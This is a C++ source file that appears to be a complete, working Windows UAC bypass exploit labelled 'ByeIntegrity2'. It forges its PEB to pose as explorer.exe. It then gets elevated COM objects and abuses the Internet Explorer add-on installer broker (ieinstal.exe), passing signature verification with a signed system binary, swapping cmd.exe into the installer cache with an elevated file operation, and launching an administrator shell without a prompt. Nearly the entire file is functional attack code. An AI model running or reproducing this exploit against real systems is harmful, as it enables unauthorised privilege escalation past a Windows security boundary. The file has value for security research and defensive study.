#include <Windows.h>
#include <ShlObj.h>
#include <ShObjIdl.h>
#include <WinTrust.h>
#include <iostream>
#include <string>

#pragma region NT Stuff
typedef struct _UNICODE_STRING
{
	unsigned short Length;
	unsigned short MaximumLength;
	long Padding_8;
	wchar_t* Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _CURDIR
{
	struct _UNICODE_STRING DosPath;
	void* Handle;
} CURDIR, *PCURDIR;

typedef struct _STRING
{
	unsigned short Length;
	unsigned short MaximumLength;
	long Padding_94;
	char* Buffer;
} STRING, *PSTRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	unsigned short Flags;
	unsigned short Length;
	unsigned long TimeStamp;
	struct _STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	unsigned long MaximumLength;
	unsigned long Length;
	unsigned long Flags;
	unsigned long DebugFlags;
	void* ConsoleHandle;
	unsigned long ConsoleFlags;
	long Padding_95;
	void* StandardInput;
	void* StandardOutput;
	void* StandardError;
	struct _CURDIR CurrentDirectory;
	struct _UNICODE_STRING DllPath;
	struct _UNICODE_STRING ImagePathName;
	struct _UNICODE_STRING CommandLine;
	void* Environment;
	unsigned long StartingX;
	unsigned long StartingY;
	unsigned long CountX;
	unsigned long CountY;
	unsigned long CountCharsX;
	unsigned long CountCharsY;
	unsigned long FillAttribute;
	unsigned long WindowFlags;
	unsigned long ShowWindowFlags;
	long Padding_96;
	struct _UNICODE_STRING WindowTitle;
	struct _UNICODE_STRING DesktopInfo;
	struct _UNICODE_STRING ShellInfo;
	struct _UNICODE_STRING RuntimeData;
	struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	unsigned __int64 EnvironmentSize;
	unsigned __int64 EnvironmentVersion;
	void* PackageDependencyData;
	unsigned long ProcessGroupId;
	unsigned long LoaderThreads;
	struct _UNICODE_STRING RedirectionDllName;
	struct _UNICODE_STRING HeapPartitionName;
	unsigned __int64* DefaultThreadpoolCpuSetMasks;
	unsigned long DefaultThreadpoolCpuSetMaskCount;
	long __PADDING__[1];
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

constexpr auto PEB_OFFSET = 0x60ULL;
constexpr auto PROCESS_PARAM_OFFSET = 0x20ULL;
constexpr auto BASENAME_OFFSET = 0x58ULL;
constexpr auto FULLNAME_OFFSET = 0x48ULL;
constexpr auto DLL_BASE_OFFSET = 0x30ULL;
#pragma endregion

using RtlInitUnicodeStringPtr = void(NTAPI*)(PUNICODE_STRING, PCWSTR);
using LDR_ENUM_CALLBACK = void(NTAPI*)(PVOID, PVOID, PBOOLEAN);
using LdrEnumerateLoadedModulesPtr = NTSTATUS(NTAPI*)(ULONG, LDR_ENUM_CALLBACK, PVOID);

struct LDR_CALLBACK_PARAMS
{
	PCWCHAR ExplorerPath;
	PVOID ImageBase;
	RtlInitUnicodeStringPtr RtlInitUnicodeString;
};

void ForgeProcessInformation(PCWCHAR explorerPath, const RtlInitUnicodeStringPtr RtlInitUnicodeString,
                             const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
{
	auto* const pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
	auto* pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);

	RtlInitUnicodeString(&pProcessParams->ImagePathName, explorerPath);
	RtlInitUnicodeString(&pProcessParams->CommandLine, L"explorer.exe");

	LDR_CALLBACK_PARAMS params{explorerPath, GetModuleHandleW(nullptr), RtlInitUnicodeString};

	LdrEnumerateLoadedModules(0, [](PVOID ldrEntry, PVOID context, PBOOLEAN stop)
	{
		auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);

		if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLL_BASE_OFFSET) == reinterpret_cast<
			ULONG_PTR>(params->ImageBase))
		{
			const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
			           fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);

			params->RtlInitUnicodeString(baseName, L"explorer.exe");
			params->RtlInitUnicodeString(fullName, params->ExplorerPath);

			*stop = TRUE;
		}
	}, reinterpret_cast<PVOID>(&params));
}

struct IIEAdminBrokerObjectForAdminInstaller : IUnknown
{
	/**
	 * \brief Creates the CActiveXInstallBroker object used by CIEAdminBrokerObject and sets the internal state flag to 1.
	 * \param providerName Name of the installer provider to be stored in the object instance.
	 * \param unknown0 Some other thing stored in the object instance.
	 * \param instanceUuid A unique UUID for this installer session. This must be passed to all methods called in CIEAdminBrokerObject.
	 * \return Standard HRESULT value.
	 */
	virtual HRESULT InitializeAdminInstaller(
		BSTR providerName,
		int unknown0,
		BSTR* instanceUuid
	) = 0;
};

const GUID IID_IeAxiAdminInstaller = {0x9AEA8A59, 0xE0C9, 0x40F1, {0x87, 0xDD, 0x75, 0x70, 0x61, 0xD5, 0x61, 0x77}};

struct IIEAdminBrokerObjectForInstaller2 : IUnknown
{
	/**
	 * \brief Authorizes a file for execution via RunSetupCommand. WinVerifyTrust is called to check the embedded certificate in the
	 * specified file, and if it passes the check, the internal state flag is set to 2, allowing us to use RunSetupCommand. Then, the file
	 * is copied into the installer cache directory with a new name. The path for this new file is given to us.
	 * \param instanceUuid The installer's instance UUID.
	 * \param verifyParentWindow The window to use for WinVerifyTrust.
	 * \param unknown0 Needs to be same as 'fileName' parameter.
	 * \param fileName The file that contains the embedded certificate which we want to verify.
	 * \param unknown1 Some unknown parameter.
	 * \param uiChoice The uiChoice member for the WINTRUST_DATA struct used by WinVerifyTrust.
	 * \param uiContext The uiContext member for the WINTRUST_DATA struct used by WinVerifyTrust.
	 * \param unknown2 Some interface ID, I just passed in IID_IUnknown. Purpose is unknown.
	 * \param verifiedFileName The path for the verified file which has been copied into the installer cache directory.
	 * \param unknown3 Some unknown parameter. [UACME says it's the file's certificate details...]
	 * \param unknown4 Some unknown parameter. [UACME says it's the file's certificate detail's length/size...]
	 * \return Standard HRESULT value.
	 */
	virtual HRESULT VerifyFile(
		BSTR instanceUuid,
		HWND verifyParentWindow,
		BSTR unknown0,
		BSTR fileName,
		BSTR unknown1,
		ULONG uiChoice,
		ULONG uiContext,
		REFGUID unknown2,
		BSTR* verifiedFileName,
		PULONG unknown3,
		PUCHAR* unknown4
	) = 0;

	/**
	 * \brief Executes the specified command line. The command line must be a command line of the file path given to us by
	 * VerifyFile. Otherwise, the function returns E_ACCESSDENIED. If the command line uses a path as one of the parameters to the
	 * executable, the backslashes must be forward slashes, otherwise E_ACCESSDENIED is returned as well (probably because the command line
	 * path check fails if a backslash is found after the main executable path). This function basically calls IEAdvpack.dll!RunSetupCommandW.
	 * \param instanceUuid The installer's instance UUID.
	 * \param parentWindow The parent window to use for IEAdvpack.dll!RunSetupCommandW.
	 * \param commandLine The command line to execute.
	 * \param infSection The infSection specification for IEAdvpack.dll!RunSetupCommandW.
	 * \param workingDirectory The working directory of the process to be launched.
	 * \param title The title to use for IEAdvPack.dll!RunSetupCommandW.
	 * \param flags A set of flags which tell IEAdvpack.dll!RunSetupCommandW how to handle the setup process: either launch the installer
	 * directly or perform an inf-based core install.
	 * \param exeHandle A handle to the launched installer, but this will always be NULL in our case.
	 * \return E_INVALIDARG on exploit success, otherwise some other unexpected HRESULT value.
	 */
	virtual HRESULT RunSetupCommand(
		BSTR instanceUuid,
		HWND parentWindow,
		BSTR commandLine,
		BSTR infSection,
		BSTR workingDirectory,
		BSTR title,
		ULONG flags,
		PHANDLE exeHandle
	) = 0;
};

const GUID IID_IeAxiInstaller2 = {0xBC0EC710, 0xA3ED, 0x4F99, {0xB1, 0x4F, 0x5F, 0xD5, 0x9F, 0xDA, 0xCE, 0xA3}};

int main()
{
	const auto hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);

	SetConsoleTextAttribute(hStdOutput, 8);
	std::wcout <<
		L" __________              .___        __                      .__  __          ________  \n"
		L" \\______   \\___.__. ____ |   | _____/  |_  ____   ___________|__|/  |_ ___.__.\\_____  \\ \n"
		L"  |    |  _<   |  |/ __ \\|   |/    \\   __\\/ __ \\ / ___\\_  __ \\  \\   __<   |  | /  ____/ \n"
		L"  |    |   \\\\___  \\  ___/|   |   |  \\  | \\  ___// /_/  >  | \\/  ||  |  \\___  |/       \\ \n"
		L"  |______  // ____|\\___  >___|___|  /__|  \\___  >___  /|__|  |__||__|  / ____|\\_______ \\\n"
		L"         \\/ \\/         \\/         \\/          \\/_____/                 \\/             \\/\n\n";
	SetConsoleTextAttribute(hStdOutput, 7);

	PWSTR windowsPath, systemPath;
	auto hr = SHGetKnownFolderPath(FOLDERID_Windows, 0, nullptr, &windowsPath);
	if (FAILED(hr))
	{
		std::wcout << L"SHGetKnownFolderPath() (0) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	hr = SHGetKnownFolderPath(FOLDERID_System, 0, nullptr, &systemPath);
	if (FAILED(hr))
	{
		CoTaskMemFree(windowsPath);
		std::wcout << L"SHGetKnownFolderPath() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	std::wstring explorer{windowsPath}, system32{systemPath};
	CoTaskMemFree(windowsPath);
	CoTaskMemFree(systemPath);
	explorer += L"\\explorer.exe";

	const auto RtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeStringPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString"));
	const auto LdrEnumerateLoadedModules = reinterpret_cast<LdrEnumerateLoadedModulesPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules"));

	ForgeProcessInformation(explorer.c_str(), RtlInitUnicodeString, LdrEnumerateLoadedModules);

	hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
	if (FAILED(hr))
	{
		std::wcout << L"CoInitializeEx() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	// because ieinstal.exe calls CoImpersonateClient during VerifyFile, we need this call so VerifyFile can succeed.
	hr = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE,
	                          nullptr, 0, nullptr);
	if (FAILED(hr))
	{
		std::wcout << L"CoInitializeSecurity() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		CoUninitialize();
		return EXIT_FAILURE;
	}

	IFileOperation* fileOperation;
	IIEAdminBrokerObjectForAdminInstaller* adminInstaller;
	BIND_OPTS3 bindOptions{};

	bindOptions.dwClassContext = CLSCTX_LOCAL_SERVER;
	bindOptions.cbStruct = sizeof BIND_OPTS3;

	hr = CoGetObject(L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}", &bindOptions,
	                 IID_IFileOperation,
	                 reinterpret_cast<void**>(&fileOperation));
	if (FAILED(hr))
	{
		CoUninitialize();
		std::wcout << L"CoGetObject() (0) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	// create an instance of an interface (IeAxiAdminInstaller) from the Internet Explorer Add-on installer coclass.
	hr = CoGetObject(L"Elevation:Administrator!new:{BDB57FF2-79B9-4205-9447-F5FE85F37312}", &bindOptions,
	                 IID_IeAxiAdminInstaller,
	                 reinterpret_cast<void**>(&adminInstaller));
	if (FAILED(hr))
	{
		fileOperation->Release();
		CoUninitialize();
		std::wcout << L"CoGetObject() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	// you'll see why we need IFileOperation later.
	hr = fileOperation->
		SetOperationFlags(FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI);
	if (FAILED(hr))
	{
		adminInstaller->Release();
		fileOperation->Release();
		CoUninitialize();
		std::wcout << L"IFileOperation::SetOperationFlags() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	/* this is the target file with the embedded certificate which will pass the WinVerifyTrust call from VerifyFile
	 * we will be using. */
	system32 += L"\\bdeunlock.exe";

	/*
	 * Begin ieinstal.exe -> CIEAdminBrokerObject::CActiveXInstallBroker
	 */

	BSTR instanceUuid;

	hr = adminInstaller->InitializeAdminInstaller(nullptr, 0, &instanceUuid);
	if (FAILED(hr))
	{
		adminInstaller->Release();
		fileOperation->Release();
		CoUninitialize();
		std::wcout << L"ieinstal.exe -> CIEAdminBrokerObject::InitializeAdminInstaller() failed. HRESULT: 0x" <<
			std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	IIEAdminBrokerObjectForInstaller2* installer2;

	// get the IeAxiInstaller2 interface from the IeAxiAdminInstaller interface.
	hr = adminInstaller->QueryInterface(IID_IeAxiInstaller2, reinterpret_cast<void**>(&installer2));
	if (FAILED(hr))
	{
		SysFreeString(instanceUuid);
		adminInstaller->Release();
		fileOperation->Release();
		CoUninitialize();
		std::wcout << L"ieinstal.exe -> CIEAdminBrokerObject::QueryInterface() failed. HRESULT: 0x" <<
			std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	auto* const fileName = SysAllocString(system32.c_str());
	BSTR targetFile;
	ULONG unknown5;
	PUCHAR unknown6;

	/*
	 * HWND is INVALID_HANDLE_VALUE: see documentation of WinVerifyTrust.
	 */
	hr = installer2->VerifyFile(instanceUuid, static_cast<HWND>(INVALID_HANDLE_VALUE), fileName, fileName, nullptr,
	                            WTD_UI_NONE, WTD_UICONTEXT_EXECUTE, IID_IUnknown, &targetFile, &unknown5, &unknown6);
	SysFreeString(fileName);
	if (FAILED(hr))
	{
		SysFreeString(instanceUuid);
		installer2->Release();
		adminInstaller->Release();
		fileOperation->Release();
		CoUninitialize();
		std::wcout << L"ieinstal.exe -> CIEAdminBrokerObject::VerifyFile() failed. HRESULT: 0x" <<
			std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	/*
	 * Replace the file in the installer cache with cmd.exe First we will copy cmd.exe to the current directory, then rename it the
	 * same name as the file in the cache. Then we will use an elevated IFileOperation instance to delete the file in the cache and
	 * copy our renamed cmd.exe into there. This will allow us to successfully execute RunSetupCommand and it will launch our cmd.exe
	 * in the cache directory.
	 */

	WCHAR file[25], directory[MAX_PATH - 2], drive[3], fullPath[MAX_PATH]{};

	_wsplitpath_s(targetFile, drive, sizeof drive / sizeof(WCHAR), directory, sizeof directory / sizeof(WCHAR), file,
	              sizeof file / sizeof(WCHAR), nullptr, 0);
	wcscat_s(file, sizeof file / sizeof(WCHAR), L".exe");
	wcscat_s(fullPath, sizeof fullPath / sizeof(WCHAR), drive);
	wcscat_s(fullPath, sizeof fullPath / sizeof(WCHAR), directory);

	CoTaskMemFree(unknown6);

	IShellItem *existingItem, *parentFolder, *newItem;

	system32 = system32.substr(0, system32.find(L"\\bdeunlock.exe"));
	system32 += L"\\cmd.exe";
	if (!CopyFileW(system32.c_str(), file, FALSE))
	{
		std::wcout << L"CopyFileW() failed. Error: " << GetLastError() << std::endl;
		SysFreeString(targetFile);
		SysFreeString(instanceUuid);
		installer2->Release();
		adminInstaller->Release();
		fileOperation->Release();
		CoUninitialize();
		return EXIT_FAILURE;
	}

	const auto requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr)) + wcslen(file) + 1;
	auto* currentDirectory = new WCHAR[requiredSize];
	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);
	wcscat_s(currentDirectory, requiredSize, L"\\");
	wcscat_s(currentDirectory, requiredSize, file);

	hr = SHCreateItemFromParsingName(currentDirectory, nullptr, IID_IShellItem, reinterpret_cast<void**>(&newItem));
	delete[] currentDirectory;
	if (FAILED(hr))
	{
		DeleteFileW(file);
		SysFreeString(targetFile);
		SysFreeString(instanceUuid);
		installer2->Release();
		adminInstaller->Release();
		fileOperation->Release();
		CoUninitialize();
		std::wcout << L"SHCreateItemFromParsingName() (0) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	hr = SHCreateItemFromParsingName(targetFile, nullptr, IID_IShellItem, reinterpret_cast<void**>(&existingItem));
	if (FAILED(hr))
	{
		newItem->Release();
		DeleteFileW(file);
		SysFreeString(targetFile);
		SysFreeString(instanceUuid);
		installer2->Release();
		adminInstaller->Release();
		fileOperation->Release();
		CoUninitialize();
		std::wcout << L"SHCreateItemFromParsingName() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	hr = SHCreateItemFromParsingName(fullPath, nullptr, IID_IShellItem, reinterpret_cast<void**>(&parentFolder));
	if (FAILED(hr))
	{
		existingItem->Release();
		newItem->Release();
		DeleteFileW(file);
		SysFreeString(targetFile);
		SysFreeString(instanceUuid);
		installer2->Release();
		adminInstaller->Release();
		fileOperation->Release();
		CoUninitialize();
		std::wcout << L"SHCreateItemFromParsingName() (2) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	hr = fileOperation->DeleteItem(existingItem, nullptr);
	if (FAILED(hr))
	{
		parentFolder->Release();
		existingItem->Release();
		newItem->Release();
		DeleteFileW(file);
		SysFreeString(targetFile);
		SysFreeString(instanceUuid);
		installer2->Release();
		adminInstaller->Release();
		fileOperation->Release();
		CoUninitialize();
		std::wcout << L"IFileOperation::DeleteItem() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	hr = fileOperation->MoveItem(newItem, parentFolder, nullptr, nullptr);
	if (FAILED(hr))
	{
		parentFolder->Release();
		existingItem->Release();
		newItem->Release();
		DeleteFileW(file);
		SysFreeString(targetFile);
		SysFreeString(instanceUuid);
		installer2->Release();
		adminInstaller->Release();
		fileOperation->Release();
		CoUninitialize();
		std::wcout << L"IFileOperation::MoveItem() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	hr = fileOperation->PerformOperations();
	parentFolder->Release();
	existingItem->Release();
	newItem->Release();
	fileOperation->Release();
	DeleteFileW(file);
	if (FAILED(hr))
	{
		SysFreeString(targetFile);
		SysFreeString(instanceUuid);
		installer2->Release();
		adminInstaller->Release();
		CoUninitialize();
		std::wcout << L"IFileOperation::PerformOperations() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	system32 = system32.substr(0, system32.find(L"\\cmd.exe"));
	auto* const workingDirectory = SysAllocString(system32.c_str());

	std::wstring commandLine{targetFile};
	/*
	 * Launch a new instance of cmd.exe and exit out of the old one. We do this because if we use the copied cmd.exe directly,
	 * there are lots of error messages and broken messages because we did not copy the language dependencies along with cmd.exe
	 * into the installer's cache directory.
	 */
	commandLine += L" /C start cmd.exe";
	SysFreeString(targetFile);
	targetFile = SysAllocString(commandLine.c_str());

	HANDLE exeHandle;
	/*
	 * 'infSection' and 'title' are not used in our case, because flags are 0: we are doing a direct launch of the installer
	 * process. However, we get an access violation if they are NULL, so just set them to our empty string pointers. They will
	 * show up as L'\0' in ieinstal.exe anyways (because they are not SysAlloc'ed() strings).
	 */
	hr = installer2->RunSetupCommand(instanceUuid, nullptr, targetFile, const_cast<BSTR>(L""), workingDirectory,
	                                 const_cast<BSTR>(L""), 0, &exeHandle);
	SysFreeString(workingDirectory);
	SysFreeString(targetFile);
	SysFreeString(instanceUuid);
	installer2->Release();
	adminInstaller->Release();
	CoUninitialize();
	if (hr != E_INVALIDARG)
		std::wcout <<
			L"ieinstal.exe -> CIEAdminBrokerObject::RunSetupCommand() did not return the expected value (E_INVALIDARG).\n";

	/*
	 * End ieinstal.exe -> CIEAdminBrokerObject::CActiveXInstallBroker
	 */

	SetConsoleTextAttribute(hStdOutput, 14);
	std::wcout << L"[";
	SetConsoleTextAttribute(hStdOutput, 15);
	std::wcout << L"@";
	SetConsoleTextAttribute(hStdOutput, 14);
	std::wcout << L"] ";
	SetConsoleTextAttribute(hStdOutput, 14);
	std::wcout << L"*** Exploit successful.\n\n";
	SetConsoleTextAttribute(hStdOutput, 7);

	return 0;
}
